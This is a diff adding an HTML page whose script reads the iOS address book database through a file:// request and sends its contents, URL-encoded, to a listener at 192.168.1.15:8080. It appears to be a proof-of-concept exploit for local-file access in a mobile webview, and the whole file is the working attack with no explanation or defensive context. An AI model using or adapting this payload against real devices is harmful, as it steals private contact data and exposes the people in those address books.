@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html> 
+<body> 
+<script> 
+
+var local_xhr = new XMLHttpRequest(); 
+local_xhr.open("GET", "file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb"); 
+local_xhr.send(); 
+local_xhr.onreadystatechange = function () {
+	if (local_xhr.readyState == 4) { 
+		var remote_xhr = new XMLHttpRequest();
+		remote_xhr.onreadystatechange = function () {};
+		remote_xhr.open("GET", "http://192.168.1.15:8080/?f=" + encodeURI(local_xhr.responseText)); 
+		remote_xhr.send(); 
+	} 
+	
+} 
+
+</script> 
+</body> 
+</html>
